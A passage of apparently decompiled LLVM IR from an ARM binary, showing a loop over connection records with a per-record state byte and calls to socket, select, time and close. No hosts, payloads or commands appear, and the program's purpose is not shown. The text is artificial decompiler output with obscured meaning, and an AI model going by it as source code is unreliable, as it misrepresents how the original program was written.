  %v1_91e0 = and i32 %v0_91dc, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %v1_91e0, i32* %r3.global-to-local, align 4
  %v1_91dc = udiv i32 %v0_91dc, 256
  %v3_91e4 = and i32 %v1_91dc, 65280
  store i32 %v3_91e4, i32* %r2.global-to-local, align 4
  %v3_91e8 = mul i32 %v0_91dc, 16777216
  %v2_91ec = and i32 %v0_91dc, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16777216)
  %v3_91ec = icmp ne i32 %v2_91ec, 0
  store i1 %v3_91ec, i1* %cpsr_c.global-to-local, align 1
  %v4_91ec = mul i32 %v1_91e0, 256
  %v5_91ec = or i32 %v4_91ec, %v3_91e8
  store i32 %v5_91ec, i32* %r1.global-to-local, align 4
  %v0_91f0 = load i32, i32* @r6, align 4
  %v1_91f0 = add i32 %v0_91f0, 20
  %v2_91f0 = inttoptr i32 %v1_91f0 to i8*
  %v3_91f0 = load i8, i8* %v2_91f0, align 1
  %v4_91f0 = zext i8 %v3_91f0 to i32
  store i32 %v4_91f0, i32* %ip.global-to-local, align 4
  %v4_91f4 = udiv i32 %v0_91dc, 16777216
  %v5_91f4 = or i32 %v3_91e4, %v4_91f4
  %v2_91f8 = or i32 %v5_91f4, %v5_91ec
  %v7_91fc = lshr i32 %v0_91d8, %v4_91f0
  %v8_91fc = add i32 %v7_91fc, %v2_91f8
  store i32 %v8_91fc, i32* %r2.global-to-local, align 4
  %v3_9208 = mul i32 %v8_91fc, 16777216
  %v1_920c = and i32 %v8_91fc, 65280
  store i32 %v1_920c, i32* %r0.global-to-local, align 4
  %v4_9210 = mul nuw nsw i32 %v1_920c, 256
  %v5_9210 = or i32 %v4_9210, %v3_9208
  store i32 %v5_9210, i32* %r1.global-to-local, align 4
  %v2_9214 = and i32 %v8_91fc, 8388608
  %v3_9214 = icmp ne i32 %v2_9214, 0
  store i1 %v3_9214, i1* %cpsr_c.global-to-local, align 1
  %v2_9218 = call i32 @llvm.bswap.i32(i32 %v8_91fc)
  store i32 %v2_9218, i32* %r3.global-to-local, align 4
  %v1_921c = load i32, i32* @r5, align 4
  %v2_921c = add i32 %v1_921c, 16
  %v3_921c = inttoptr i32 %v2_921c to i32*
  store i32 %v2_9218, i32* %v3_921c, align 4
  br label %dec_label_pc_abc8

dec_label_pc_924c:                                ; preds = %thread-pre-split
  %v1_9250 = add i32 %v3_9108, 1456
  %v0_9258 = load i32, i32* %r8.global-to-local, align 4
  %v1_9258 = urem i32 %v0_9258, 256
  store i32 %v1_9258, i32* %r3.global-to-local, align 4
  %v1_925c = add i32 %v3_9108, 1464
  store i32 %v1_925c, i32* %r1.global-to-local, align 4
  %v2_9260 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_9260, i32* %r2.global-to-local, align 4
  store i32 %v1_9250, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_9280.preheader

dec_label_pc_9280.preheader:                      ; preds = %dec_label_pc_924c, %dec_label_pc_abec
  %storemerge145.in.in = phi i32 [ %v0_ac00, %dec_label_pc_abec ], [ %v0_9258, %dec_label_pc_924c ]
  %stack_var_-20868.0.ph = phi i32 [ %v1_abf8, %dec_label_pc_abec ], [ %v1_9250, %dec_label_pc_924c ]
  %stack_var_-20860.0.ph = phi i32 [ %v1_ac00, %dec_label_pc_abec ], [ %v1_9258, %dec_label_pc_924c ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_ac04, %dec_label_pc_abec ], [ %v1_925c, %dec_label_pc_924c ]
  %stack_var_-20856.0.ph = phi i32 [ %v2_ac08, %dec_label_pc_abec ], [ %v2_9260, %dec_label_pc_924c ]
  %storemerge145.in = and i32 %storemerge145.in.in, 128
  %storemerge145 = icmp ne i32 %storemerge145.in, 0
  store i1 %storemerge145, i1* %cpsr_c.global-to-local, align 1
  %v3_ac10 = udiv i32 %storemerge145.in.in, 256
  store i32 %v3_ac10, i32* %r8.global-to-local, align 4
  %v4_92e8 = mul nuw nsw i32 %stack_var_-20860.0.ph, 256
  %v1_9698 = inttoptr i32 %stack_var_-20856.0.ph to i8*
  %v1_99ec = icmp slt i32 %v6_8f58, 0
  %v2_99ec = icmp eq i32 %v6_8f58, 0
  %v2_9a48 = ptrtoint i32* %stack_var_-148 to i32
  %v2_9a54 = ptrtoint i32* %stack_var_-36 to i32
  %v1_98e8 = inttoptr i32 %v6_8f58 to i8*
  %v2_950c = ptrtoint i32* %stack_var_-56 to i32
  %v2_9510 = ptrtoint i32* %stack_var_-200 to i32
  %v2_9514 = ptrtoint i32* %stack_var_-328 to i32
  %v2_9f74 = add i32 %v2_9a54, -20773
  %v2_9600 = ptrtoint i32* %stack_var_-44 to i32
  %v2_960c = ptrtoint i32* %stack_var_-48 to i32
  %v5_92e8 = or i32 %v4_92e8, %v3_ac10
  %v1_92ec = and i32 %v3_ac10, 128
  %v2_92ec = icmp ne i32 %v1_92ec, 0
  %v3_92ec248 = udiv i32 %v5_92e8, 256
  %v1_92f4 = add i32 %stack_var_-20872.0.ph, -1464
  %v1_92fc = add i32 %stack_var_-20872.0.ph, -33
  %v2_9334 = add i32 %v2_9a48, 112
  br label %dec_label_pc_9280.outer

dec_label_pc_9280.outer:                          ; preds = %dec_label_pc_94ec, %dec_label_pc_94e4, %dec_label_pc_9590, %dec_label_pc_9280.preheader
  %stack_var_-40.1.ph = phi i32 [ %v7_907c, %dec_label_pc_9280.preheader ], [ %stack_var_-40.5, %dec_label_pc_94ec ], [ %stack_var_-40.5, %dec_label_pc_94e4 ], [ %stack_var_-40.6, %dec_label_pc_9590 ]
  br label %dec_label_pc_9280

dec_label_pc_9280:                                ; preds = %dec_label_pc_9280.outer, %dec_label_pc_92cc
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9284 = call i32 @time(i32* null)
  store i32 %v2_9284, i32* %r0.global-to-local, align 4
  store i32 %v2_9284, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 20684, i32* %ip.global-to-local, align 4
  %v2_92a4262 = load i32, i32* %sp.global-to-local, align 4
  %v3_92a4263 = add i32 %v2_92a4262, 20684
  %v4_92a4264 = inttoptr i32 %v3_92a4263 to i32*
  store i32 0, i32* %v4_92a4264, align 4
  br label %dec_label_pc_9294.dec_label_pc_9294_crit_edge

dec_label_pc_9294.dec_label_pc_9294_crit_edge:    ; preds = %dec_label_pc_9280, %dec_label_pc_9294.dec_label_pc_9294_crit_edge
  %v0_9294.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_92a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_9298 = add i32 %v0_9294.pre, 4
  store i32 %v1_9298, i32* %r3.global-to-local, align 4
  %v1_929c = add i32 %v0_9294.pre, 20684
  store i32 %v1_929c, i32* %ip.global-to-local, align 4
  %v7_92a0 = icmp eq i32 %v1_9298, 128
  %v2_92a4 = load i32, i32* %sp.global-to-local, align 4
  %v3_92a4 = add i32 %v2_92a4, %v1_929c
  %v4_92a4 = inttoptr i32 %v3_92a4 to i32*
  store i32 %v0_92a4.pre, i32* %v4_92a4, align 4
  br i1 %v7_92a0, label %dec_label_pc_92ac, label %dec_label_pc_9294.dec_label_pc_9294_crit_edge

dec_label_pc_92ac:                                ; preds = %dec_label_pc_9294.dec_label_pc_9294_crit_edge
  %v1_92a0 = add i32 %v0_9294.pre, -124
  %v6_92a0 = icmp slt i32 %v1_92a0, 0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_92a0, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_92ac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_92ac, i32* %r0.global-to-local, align 4
  %v1_92b8265 = add i32 %v0_92ac, 4
  store i32 %v1_92b8265, i32* %r3.global-to-local, align 4
  %v1_92bc266 = add i32 %v0_92ac, 20556
  store i32 %v1_92bc266, i32* %lr.global-to-local, align 4
  %v7_92c0267 = icmp eq i32 %v1_92b8265, 128
  %v2_92c4268 = load i32, i32* %sp.global-to-local, align 4
  %v3_92c4269 = add i32 %v2_92c4268, %v1_92bc266
  %v4_92c4270 = inttoptr i32 %v3_92c4269 to i32*
  store i32 %v0_92ac, i32* %v4_92c4270, align 4
  br i1 %v7_92c0267, label %dec_label_pc_92cc, label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge

dec_label_pc_92b4.dec_label_pc_92b4_crit_edge:    ; preds = %dec_label_pc_92ac, %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge
  %v0_92b4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_92c4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_92b8 = add i32 %v0_92b4.pre, 4
  store i32 %v1_92b8, i32* %r3.global-to-local, align 4
  %v1_92bc = add i32 %v0_92b4.pre, 20556
  store i32 %v1_92bc, i32* %lr.global-to-local, align 4
  %v7_92c0 = icmp eq i32 %v1_92b8, 128
  %v2_92c4 = load i32, i32* %sp.global-to-local, align 4
  %v3_92c4 = add i32 %v2_92c4, %v1_92bc
  %v4_92c4 = inttoptr i32 %v3_92c4 to i32*
  store i32 %v0_92c4.pre, i32* %v4_92c4, align 4
  br i1 %v7_92c0, label %dec_label_pc_92cc, label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge

dec_label_pc_92cc:                                ; preds = %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge, %dec_label_pc_92ac
  store i32 %v0_90f4, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_9110, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_9110, i1* %cpsr_z.global-to-local, align 1
  br i1 %tmp205, label %dec_label_pc_9280, label %dec_label_pc_92d8

dec_label_pc_92d8:                                ; preds = %dec_label_pc_92cc
  store i32 %stack_var_-20872.0.ph, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 %v5_92e8, i32* %r2.global-to-local, align 4
  store i1 %v2_92ec, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_92ec248, i32* %lr.global-to-local, align 4
  %v0_92f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_92f0, i32* @sl, align 4
  store i32 %v1_92f4, i32* @r7, align 4
  store i32 %v0_92f0, i32* @r8, align 4
  store i32 %v1_92fc, i32* @r6, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_93a8

dec_label_pc_9310:                                ; preds = %dec_label_pc_93b4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v7_9310 = icmp eq i8 %v3_93a8, 2
  store i1 %v7_9310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9310, label %dec_label_pc_9ac0, label %dec_label_pc_9318

dec_label_pc_9318:                                ; preds = %dec_label_pc_9310
  %v2_9318 = icmp ugt i8 %v3_93a8, 3
  store i1 %v2_9318, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9318 = icmp ult i8 %v3_93a8, 4
  store i1 %v6_9318, i1* %cpsr_n.global-to-local, align 1
  %v7_9318 = icmp eq i8 %v3_93a8, 4
  store i1 %v7_9318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9318, label %dec_label_pc_9664, label %dec_label_pc_9320

dec_label_pc_9320:                                ; preds = %dec_label_pc_9318
  %v2_9320 = icmp ugt i8 %v3_93a8, 5
  store i1 %v2_9320, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9320 = icmp ult i8 %v3_93a8, 6
  store i1 %v6_9320, i1* %cpsr_n.global-to-local, align 1
  %v7_9320 = icmp eq i8 %v3_93a8, 6
  store i1 %v7_9320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9320, label %.thread22, label %dec_label_pc_9340

.thread22:                                        ; preds = %dec_label_pc_9320
  %v2_9324 = add i32 %v3_9658, -1431
  %v3_9324 = inttoptr i32 %v2_9324 to i32*
  %v4_9324 = load i32, i32* %v3_9324, align 4
  store i32 %v4_9324, i32* %r0.global-to-local, align 4
  %v4_932c = udiv i32 %v4_9324, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_9330 = mul nuw nsw i32 %v4_932c, 4
  store i32 %v2_9334, i32* %r1.global-to-local, align 4
  %v3_9338 = add i32 %v4_9330, %v2_9334
  store i32 %v3_9338, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9340:                                ; preds = %dec_label_pc_9320
  %v2_9340 = icmp ugt i8 %v3_93a8, 6
  store i1 %v2_9340, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9340 = icmp ult i8 %v3_93a8, 7
  store i1 %v6_9340, i1* %cpsr_n.global-to-local, align 1
  %v7_9340 = icmp eq i8 %v3_93a8, 7
  store i1 %v7_9340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9340, label %.thread33, label %dec_label_pc_9360

.thread33:                                        ; preds = %dec_label_pc_9340
  %v2_9344 = add i32 %v3_9658, -1431
  %v3_9344 = inttoptr i32 %v2_9344 to i32*
  %v4_9344 = load i32, i32* %v3_9344, align 4
  store i32 %v4_9344, i32* %r0.global-to-local, align 4
  %v4_934c = udiv i32 %v4_9344, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_9350 = mul nuw nsw i32 %v4_934c, 4
  store i32 %v2_9334, i32* %r2.global-to-local, align 4
  %v3_9358 = add i32 %v4_9350, %v2_9334
  store i32 %v3_9358, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9aa0

dec_label_pc_9360:                                ; preds = %dec_label_pc_9340
  %v2_9360 = icmp ugt i8 %v3_93a8, 9
  store i1 %v2_9360, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9360 = icmp ult i8 %v3_93a8, 10
  store i1 %v6_9360, i1* %cpsr_n.global-to-local, align 1
  %v7_9360 = icmp eq i8 %v3_93a8, 10
  store i1 %v7_9360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9360, label %dec_label_pc_9a88, label %dec_label_pc_9368

dec_label_pc_9368:                                ; preds = %dec_label_pc_9360
  %v1_9368 = add nsw i32 %v4_93a8, -11
  %v2_9368 = icmp ugt i8 %v3_93a8, 10
  store i1 %v2_9368, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9368 = icmp ult i8 %v3_93a8, 11
  store i1 %v6_9368, i1* %cpsr_n.global-to-local, align 1
  %v7_9368 = icmp eq i8 %v3_93a8, 11
  store i1 %v7_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9368, label %dec_label_pc_a5fc, label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_9ac0, %dec_label_pc_9368
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_93a8, align 1
  %v0_9378 = load i32, i32* @r6, align 4
  %v1_9378 = add i32 %v0_9378, -1431
  %v2_9378 = inttoptr i32 %v1_9378 to i32*
  %v3_9378 = load i32, i32* %v2_9378, align 4
  store i32 %v3_9378, i32* %r0.global-to-local, align 4
  %v1_937c = call i32 @close(i32 %v3_9378)
  store i32 %v1_937c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9384 = load i32, i32* @r6, align 4
  %v2_9384 = add i32 %v1_9384, -1431
  %v3_9384 = inttoptr i32 %v2_9384 to i32*
  store i32 -1, i32* %v3_9384, align 4
  br label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_9a24, %dec_label_pc_9aa0, %dec_label_pc_9ad0, %dec_label_pc_a5fc, %dec_label_pc_9370
  %stack_var_-40.2 = phi i32 [ %stack_var_-40.10, %dec_label_pc_9a24 ], [ %stack_var_-40.3, %dec_label_pc_9370 ], [ %stack_var_-40.3, %dec_label_pc_9ad0 ], [ %stack_var_-40.3, %dec_label_pc_9aa0 ], [ %stack_var_-40.3, %dec_label_pc_a5fc ]
  store i32 %v0_90f4, i32* %lr.global-to-local, align 4
  %v0_938c = load i32, i32* @r8, align 4
  %v1_938c = add i32 %v0_938c, 1
  store i32 %v1_938c, i32* @r8, align 4
  %v0_9390 = load i32, i32* @r7, align 4
  %v0_9394 = load i32, i32* @r6, align 4
  %v2_9398 = sub i32 %v0_90f4, %v1_938c
  %v3_9398 = icmp uge i32 %v0_90f4, %v1_938c
  store i1 %v3_9398, i1* %cpsr_c.global-to-local, align 1
  %v4_9398 = xor i32 %v1_938c, %v0_90f4
  %v5_9398 = xor i32 %v2_9398, %v0_90f4
  %v6_9398 = and i32 %v5_9398, %v4_9398
  %v7_9398 = icmp slt i32 %v6_9398, 0
  store i1 %v7_9398, i1* %cpsr_v.global-to-local, align 1
  %v8_9398 = icmp slt i32 %v2_9398, 0
  store i1 %v8_9398, i1* %cpsr_n.global-to-local, align 1
  %v9_9398 = icmp eq i32 %v0_90f4, %v1_938c
  store i1 %v9_9398, i1* %cpsr_z.global-to-local, align 1
  %v1_939c = add i32 %v0_9390, 3140
  store i32 %v1_939c, i32* @r7, align 4
  %v1_93a0 = add i32 %v0_9394, 3140
  store i32 %v1_93a0, i32* @r6, align 4
  br i1 %v9_9398, label %dec_label_pc_9388.dec_label_pc_94e4_crit_edge, label %dec_label_pc_93a8

dec_label_pc_9388.dec_label_pc_94e4_crit_edge:    ; preds = %dec_label_pc_9388
  %v0_94e4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_94e4

dec_label_pc_93a8:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_9388, %dec_label_pc_92d8
  %v3_9658 = phi i32 [ %v1_92fc, %dec_label_pc_92d8 ], [ %v1_94dc, %dec_label_pc_94c4 ], [ %v1_93a0, %dec_label_pc_9388 ]
  %stack_var_-40.3 = phi i32 [ %stack_var_-40.1.ph, %dec_label_pc_92d8 ], [ %stack_var_-40.4, %dec_label_pc_94c4 ], [ %stack_var_-40.2, %dec_label_pc_9388 ]
  %v1_93a8 = add i32 %v3_9658, -1427
  %v2_93a8 = inttoptr i32 %v1_93a8 to i8*
  %v3_93a8 = load i8, i8* %v2_93a8, align 1
  %v4_93a8 = zext i8 %v3_93a8 to i32
  store i32 %v4_93a8, i32* %r3.global-to-local, align 4
  %v2_93ac = icmp ne i8 %v3_93a8, 0
  store i1 %v2_93ac, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_93ac = icmp eq i8 %v3_93a8, 0
  store i1 %v6_93ac, i1* %cpsr_n.global-to-local, align 1
  %v7_93ac = icmp eq i8 %v3_93a8, 1
  store i1 %v7_93ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93ac, label %dec_label_pc_964c, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v6_93ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_93ac, label %dec_label_pc_93bc, label %dec_label_pc_9310

dec_label_pc_93bc:                                ; preds = %dec_label_pc_93b4, %.thread41.dec_label_pc_93bc_crit_edge
  %v0_93bc = phi i32 [ %v0_93bc.pre, %.thread41.dec_label_pc_93bc_crit_edge ], [ %v3_9658, %dec_label_pc_93b4 ]
  %v1_93bc = add i32 %v0_93bc, -1431
  %v2_93bc = inttoptr i32 %v1_93bc to i32*
  %v3_93bc = load i32, i32* %v2_93bc, align 4
  store i32 %v3_93bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v1_93c8 = add i32 %v3_93bc, 1
  %v2_93c8 = icmp eq i32 %v3_93bc, -1
  store i1 %v2_93c8, i1* %cpsr_c.global-to-local, align 1
  %v3_93c8 = sub i32 0, %v3_93bc
  %v4_93c8 = and i32 %v1_93c8, %v3_93c8
  %v5_93c8 = icmp slt i32 %v4_93c8, 0
  store i1 %v5_93c8, i1* %cpsr_v.global-to-local, align 1
  %v6_93c8 = icmp slt i32 %v1_93c8, 0
  store i1 %v6_93c8, i1* %cpsr_n.global-to-local, align 1
  %v7_93c8 = icmp eq i32 %v1_93c8, 0
  store i1 %v7_93c8, i1* %cpsr_z.global-to-local, align 1
  store i32 37856, i32* %lr.global-to-local, align 4
  %v1_93dc = xor i1 %v7_93c8, true
  call void @__pseudo_cond_branch(i1 %v1_93dc, i32 ptrtoint (i32* @global_var_8dcc.81 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_93e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_93e8, i32* %r2.global-to-local, align 4
  %v3_93ec = call i32 @_socket(i32 2, i32 1, i32 %v0_93e8)
  unreachable

dec_label_pc_94c0:                                ; preds = %dec_label_pc_9ad0
  %v0_94c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_94c0 = add i32 %v0_94c0, 1
  store i32 %v1_94c0, i32* @sl, align 4
  br label %dec_label_pc_94c4

dec_label_pc_94c4:                                ; preds = %dec_label_pc_9ab8, %dec_label_pc_9a80, %dec_label_pc_94c0
  %v0_94e496 = phi i32 [ %v1_9a80, %dec_label_pc_9a80 ], [ %v1_94c0, %dec_label_pc_94c0 ], [ %v1_9ab8, %dec_label_pc_9ab8 ]
  %stack_var_-40.4 = phi i32 [ %stack_var_-40.10, %dec_label_pc_9a80 ], [ %stack_var_-40.3, %dec_label_pc_94c0 ], [ %stack_var_-40.3, %dec_label_pc_9ab8 ]
  store i32 %v0_90f4, i32* %lr.global-to-local, align 4
  %v0_94c8 = load i32, i32* @r8, align 4
  %v1_94c8 = add i32 %v0_94c8, 1
  store i32 %v1_94c8, i32* @r8, align 4
  %v0_94cc = load i32, i32* @r7, align 4
  %v0_94d0 = load i32, i32* @r6, align 4
  %v2_94d4 = sub i32 %v0_90f4, %v1_94c8
  %v3_94d4 = icmp uge i32 %v0_90f4, %v1_94c8
  store i1 %v3_94d4, i1* %cpsr_c.global-to-local, align 1
  %v4_94d4 = xor i32 %v1_94c8, %v0_90f4
  %v5_94d4 = xor i32 %v2_94d4, %v0_90f4
  %v6_94d4 = and i32 %v5_94d4, %v4_94d4
  %v7_94d4 = icmp slt i32 %v6_94d4, 0
  store i1 %v7_94d4, i1* %cpsr_v.global-to-local, align 1
  %v8_94d4 = icmp slt i32 %v2_94d4, 0
  store i1 %v8_94d4, i1* %cpsr_n.global-to-local, align 1
  %v9_94d4 = icmp eq i32 %v0_90f4, %v1_94c8
  store i1 %v9_94d4, i1* %cpsr_z.global-to-local, align 1
  %v1_94d8 = add i32 %v0_94cc, 3140
  store i32 %v1_94d8, i32* @r7, align 4
  %v1_94dc = add i32 %v0_94d0, 3140
  store i32 %v1_94dc, i32* @r6, align 4
  br i1 %v9_94d4, label %dec_label_pc_94e4, label %dec_label_pc_93a8

dec_label_pc_94e4:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_9388.dec_label_pc_94e4_crit_edge
  %v0_951c = phi i32 [ %v0_94e4.pre, %dec_label_pc_9388.dec_label_pc_94e4_crit_edge ], [ %v0_94e496, %dec_label_pc_94c4 ]
  %stack_var_-40.5 = phi i32 [ %stack_var_-40.2, %dec_label_pc_9388.dec_label_pc_94e4_crit_edge ], [ %stack_var_-40.4, %dec_label_pc_94c4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_94e4 = icmp slt i32 %v0_951c, 0
  store i1 %v1_94e4, i1* %cpsr_n.global-to-local, align 1
  %v2_94e4 = icmp eq i32 %v0_951c, 0
  store i1 %v2_94e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94e4, label %dec_label_pc_9280.outer, label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94e4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-56, align 4
  store i32 %v2_950c, i32* %ip.global-to-local, align 4
  store i32 %v2_9510, i32* %r1.global-to-local, align 4
  store i32 %v2_9514, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_951c, i32* %r0.global-to-local, align 4
  %v0_9524 = call i32 @_select()
  store i32 %v0_9524, i32* @r4, align 4
  %v0_952c = load i32, i32* @r5, align 4
  store i32 %v0_952c, i32* %r0.global-to-local, align 4
  %v1_9530 = inttoptr i32 %v0_952c to i32*
  %v2_9530 = call i32 @time(i32* %v1_9530)
  store i32 %v2_9530, i32* %r0.global-to-local, align 4
  %v0_9534 = load i32, i32* @r4, align 4
  %v1_9534 = load i32, i32* @r5, align 4
  %v2_9534 = sub i32 %v0_9534, %v1_9534
  %v3_9534 = icmp uge i32 %v0_9534, %v1_9534
  store i1 %v3_9534, i1* %cpsr_c.global-to-local, align 1
  %v4_9534 = xor i32 %v1_9534, %v0_9534
  %v5_9534 = xor i32 %v2_9534, %v0_9534
  %v6_9534 = and i32 %v5_9534, %v4_9534
  %v7_9534 = icmp slt i32 %v6_9534, 0
  store i1 %v7_9534, i1* %cpsr_v.global-to-local, align 1
  %v8_9534 = icmp slt i32 %v2_9534, 0
  store i1 %v8_9534, i1* %cpsr_n.global-to-local, align 1
  %v9_9534 = icmp eq i32 %v0_9534, %v1_9534
  store i1 %v9_9534, i1* %cpsr_z.global-to-local, align 1
  %v7_953c = icmp sgt i32 %v0_9534, %v1_9534
  br i1 %v7_953c, label %dec_label_pc_9540, label %dec_label_pc_9280.outer

dec_label_pc_9540:                                ; preds = %dec_label_pc_94ec
  store i32 %stack_var_-20868.0.ph, i32* @r8, align 4
  br label %dec_label_pc_95b0

dec_label_pc_954c:                                ; preds = %.thread36.dec_label_pc_954c_crit_edge, %dec_label_pc_95c0
  %v0_9564 = phi i32 [ %v0_954c.pre, %.thread36.dec_label_pc_954c_crit_edge ], [ %v3_95b0, %dec_label_pc_95c0 ]
  %v3_954c = udiv i32 %v0_9564, 32
  store i32 %v2_9a54, i32* %r2.global-to-local, align 4
  %v3_9558 = mul nuw nsw i32 %v3_954c, 4
  %v2_955c = add i32 %v3_9558, %v2_9a54
  store i32 %v2_955c, i32* %r3.global-to-local, align 4
  %v1_9560 = add i32 %v2_955c, -164
  %v2_9560 = inttoptr i32 %v1_9560 to i32*
  %v3_9560 = load i32, i32* %v2_9560, align 4
  %v1_9564 = urem i32 %v0_9564, 32
  store i32 %v1_9564, i32* %r1.global-to-local, align 4
  %v2_9568 = add nsw i32 %v1_9564, -1
  %v3_9568 = shl i32 1, %v2_9568
  %v4_9568 = and i32 %v3_9568, %v3_9560
  %v5_9568 = icmp ne i32 %v4_9568, 0
  store i1 %v5_9568, i1* %cpsr_c.global-to-local, align 1
  %v6_9568 = lshr i32 %v3_9560, %v1_9564
  store i32 %v6_9568, i32* %r2.global-to-local, align 4
  %v1_956c = urem i32 %v6_9568, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_956c = icmp eq i32 %v1_956c, 0
  store i1 %v2_956c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_956c, label %dec_label_pc_9590, label %dec_label_pc_9574

dec_label_pc_9574:                                ; preds = %dec_label_pc_954c
  %v0_9574 = load i32, i32* @r8, align 4
  %v1_9574 = add i32 %v0_9574, -1452
  %v2_9574 = inttoptr i32 %v1_9574 to i8*
  %v3_9574 = load i8, i8* %v2_9574, align 1
  %v4_9574 = zext i8 %v3_9574 to i32
  store i32 %v4_9574, i32* %r3.global-to-local, align 4
  %v2_9578 = icmp ugt i8 %v3_9574, 5
  store i1 %v2_9578, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9578 = icmp ult i8 %v3_9574, 6
  store i1 %v6_9578, i1* %cpsr_n.global-to-local, align 1
  %v7_9578 = icmp eq i8 %v3_9574, 6
  store i1 %v7_9578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9578, label %dec_label_pc_9b28, label %dec_label_pc_9580

dec_label_pc_9580:                                ; preds = %dec_label_pc_9574
  %v2_9580 = icmp ugt i8 %v3_9574, 6
  store i1 %v2_9580, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9580 = icmp ult i8 %v3_9574, 7
  store i1 %v6_9580, i1* %cpsr_n.global-to-local, align 1
  %v7_9580 = icmp eq i8 %v3_9574, 7
  store i1 %v7_9580, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9580, label %dec_label_pc_a164, label %dec_label_pc_9588

dec_label_pc_9588:                                ; preds = %dec_label_pc_9580
  %v2_9588 = icmp ugt i8 %v3_9574, 9
  store i1 %v2_9588, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9588 = icmp ult i8 %v3_9574, 10
  store i1 %v6_9588, i1* %cpsr_n.global-to-local, align 1
  %v7_9588 = icmp eq i8 %v3_9574, 10
  store i1 %v7_9588, i1* %cpsr_z.global-to-local, align 1
